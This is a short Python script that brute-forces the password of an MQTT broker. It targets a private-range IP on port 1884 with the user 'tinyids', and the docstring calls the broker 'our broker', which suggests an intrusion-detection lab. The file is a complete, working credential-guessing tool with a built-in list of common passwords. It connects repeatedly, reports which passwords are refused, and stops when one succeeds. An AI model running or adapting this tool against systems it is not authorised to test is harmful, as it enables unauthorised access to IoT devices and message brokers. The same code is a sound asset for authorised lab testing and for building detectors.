"""MQTT brute force: try common passwords for one user on our broker (port 1884) until one works.

python mqtt_bruteforce.py 172.29.1.135
python mqtt_bruteforce.py 172.29.1.135 --user tinyids --tries 30
"""
import argparse
import time

import paho.mqtt.client as mqtt

PASSWORDS = ["123456", "password", "admin", "12345678", "qwerty", "123456789", "12345", "1234", "111111", "1234567",
             "dragon", "123123", "baseball", "abc123", "football", "monkey", "letmein", "696969", "shadow", "master",
             "666666", "qwertyuiop", "123321", "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx",
             "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1", "jordan", "jennifer", "mosquitto",
             "iot123", "raspberry", "tinyids", "tinyids123"]


class BruteForcer:
    def __init__(self, target, port, user):
        self.target, self.port, self.user = target, port, user

    def try_password(self, password, number):
        result = {}
        client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id=f"bf-{number}")
        client.username_pw_set(self.user, password)
        client.on_connect = lambda c, u, f, code, p: result.setdefault("code", code)
        client.connect(self.target, self.port, keepalive=5)
        client.loop_start()
        start = time.time()
        while "code" not in result and time.time() - start < 3:
            time.sleep(0.02)
        client.loop_stop()
        client.disconnect()
        return result.get("code") == 0

    def run(self, tries):
        print(f"MQTT brute force: {self.target}:{self.port}, user '{self.user}', up to {tries} passwords")
        for number, password in enumerate(PASSWORDS[:tries], 1):
            ok = self.try_password(password, number)
            print(f"  {number:2d}. {password:<12} {'SUCCESS' if ok else 'refused'}")
            if ok:
                print(f"password found: {password}")
                return
            time.sleep(0.1)
        print("no password found")


if __name__ == "__main__":
    p = argparse.ArgumentParser(description="MQTT dictionary brute force")
    p.add_argument("target")
    p.add_argument("--port", type=int, default=1884)
    p.add_argument("--user", default="tinyids")
    p.add_argument("--tries", type=int, default=len(PASSWORDS))
    a = p.parse_args()
    BruteForcer(a.target, a.port, a.user).run(a.tries)
